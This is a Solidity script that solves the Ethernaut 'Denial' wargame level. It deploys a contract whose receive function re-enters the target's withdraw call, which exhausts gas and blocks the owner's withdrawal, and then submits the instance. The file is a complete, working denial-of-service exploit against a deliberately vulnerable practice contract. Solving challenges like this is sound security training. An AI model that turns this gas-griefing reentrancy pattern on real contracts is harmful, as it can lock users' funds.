// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Denial} from "../src/Denial.sol";

/**
 *
 * Level address: 0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6
 * This is a simple wallet that drips funds over time. You can withdraw the
 * funds slowly by becoming a withdrawing partner.
 *
 * If you can deny the owner from withdrawing funds when they call withdraw()
 * (whilst the contract still has funds, and the transaction is of 1M gas or
 * less) you will win this level.
 *
 */
contract Pawn {
    Denial private denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    receive() external payable {
        denial.withdraw();
    }
}

contract DenialScript is Attacker {
    Level private level = Level(0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level, 0.001 ether);
        Denial denial = Denial(payable(instance));
        Pawn pawn = new Pawn(denial);

        denial.setWithdrawPartner(address(pawn));

        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
